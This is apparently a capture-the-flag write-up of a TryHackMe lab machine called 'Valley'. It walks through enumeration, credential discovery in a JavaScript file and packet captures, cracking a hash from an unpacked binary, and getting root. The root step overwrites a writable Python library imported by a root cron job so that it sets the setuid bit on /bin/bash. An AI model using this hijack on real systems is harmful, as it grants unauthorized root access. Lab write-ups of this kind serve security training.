---
title: THM Valley
author: hanhctf
date: 2023-05-29 18:22:22 +0700
categories: [Write-up, THM]
tags: [python]
toc: true
mermaid: true
---

# [**Valley**](https://www.tryhackme.com/room/valleype)

# Summary
> - Enumeration website get hidden directory  
> - Use creds login ftp -->  creds --> user.txt     
> - Login SSH, analyse binary file -> creds  
> - Change user --> check cronjob  --> python import file --> root.txt  

## NMAP
```
PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c2842ac1225a10f16616dda0f6046295 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCf7Zvn7fOyAWUwEI2aH/k8AyPehxzzuNC1v4AAlhDa4Off4085gRIH/EXpjOoZSBvo8magsCH32JaKMMc59FSK4canP2I0VrXwkEX0F8PjA1TV4qgqXJI0zNVwFrfBORDdlCPNYiqRNFp1vaxTqLOFuHt5r34134yRwczxTsD4Uf9Z6c7Yzr0GV6NL3baGHDeSZ/msTiFKFzLTTKbFkbU4SQYc7jIWjl0ylQ6qtWivBiavEWTwkHHKWGg9WEdFpU2zjeYTrDNnaEfouD67dXznI+FiiTiFf4KC9/1C+msppC0o77nxTGI0352wtBV9KjTU/Aja+zSTMDxoGVvo/BabczvRCTwhXxzVpWNe3YTGeoNESyUGLKA6kUBfFNICrJD2JR7pXYKuZVwpJUUCpy5n6MetnonUo0SoMg/fzqMWw2nCZOpKzVo9OdD8R/ZTnX/iQKGNNvgD7RkbxxFK5OA9TlvfvuRUQQaQP7+UctsaqG2F9gUfWorSdizFwfdKvRU=
|   256 429e2ff63e5adb51996271c48c223ebb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNIiJc4hdfcu/HtdZN1fyz/hU1SgSas1Lk/ncNc9UkfSDG2SQziJ/5SEj1AQhK0T4NdVeaMSDEunQnrmD1tJ9hg=
|   256 2ea0a56cd983e0016cb98a609b638672 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEZhkboYdSkdR3n1G4sQtN4uO3hy89JxYkizKi6Sd/Ky
80/tcp    open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.41 (Ubuntu)
37370/tcp open  ftp     syn-ack vsftpd 3.0.3

```   

have 3 ports open `22 for SSH`, `80 for http`, `37370 for ftp`  

## Web Enumeration

We see 3 directory and a note on `/pricing`  
![](/commons/THM/Valley/0_note.png)  

Continous use enumeration on `/static`, we can see hiden directory  `/static/00`   

![](/commons/THM/Valley/1_hiden_dir.png)  

On hiden directory, this is login form.  
View source code, we see a `dev.js` file.   
On this file have creds to login.  

![](/commons/THM/Valley/2_first_cred.png)  

## Foothold

After login, we can see other note.  

Try use this creds to login ftp service.  

We success login ftp.  
And see 3 `.pcapng` files.  

Use `Wireshark` analyse.   
On `siemHTTP2.pcapng`, we export some `.html` that include creds.   


Use this creds to login `ssh`   
We success login with `valleyDev`.  

***GOT USER.TXT FLAG***

## Privilege Escalation
  
In `/home`, we see `valleyAuthenticator` file.  

Run file, this file ask username and password.  

![](/commons/THM/Valley/3_valleyAuthenticator.png)

--> get to local analyse  

Check header of file. We see the file was packed with UPX.  

![](/commons/THM/Valley/4_UPX.png)  

After unpack with `UPX` and anylyse ELF file.   
This file will encrypt MD5 and compare them with hash in data.   
Check MD5 in data with [crackstation](https://crackstation.net/)  
We have password of `valley`   
Change user to `valley`  

`linpeas.sh`, My favorite tool to find priv vector.   

With `linpeas.sh`, we see   
1. A cron job `1  *    * * *   root    python3 /photos/script/photosEncrypt.py`  
2. Group writeable  
```
Group valleyAdmin:
/usr/lib/python3.8
/usr/lib/python3.8/base64.py
```   

First, check `photosEncrypt.py`  

```
#!/usr/bin/python3
import base64
for i in range(1,7):
# specify the path to the image file you want to encode
        image_path = "/photos/p" + str(i) + ".jpg"

# open the image file and read its contents
        with open(image_path, "rb") as image_file:
          image_data = image_file.read()

# encode the image data in Base64 format
        encoded_image_data = base64.b64encode(image_data)

# specify the path to the output file
        output_path = "/photos/photoVault/p" + str(i) + ".enc"

# write the Base64-encoded image data to the output file
        with open(output_path, "wb") as output_file:
          output_file.write(encoded_image_data)

```   

This file will load `base64` module. And we have writeable `/usr/lib/python3.8/base64.py`  --> BOOM   

Edit `/usr/lib/python3.8/base64.py`  
```shell
echo "import os;os.system('chmod u+s /bin/bash')" > /usr/lib/python3.8/base64.py
```   
And wait cron job.   

![](/commons/THM/Valley/5_root.png)  

```shell
/bin/bash -p
```  

***GOT ROOT.TXT FLAG***
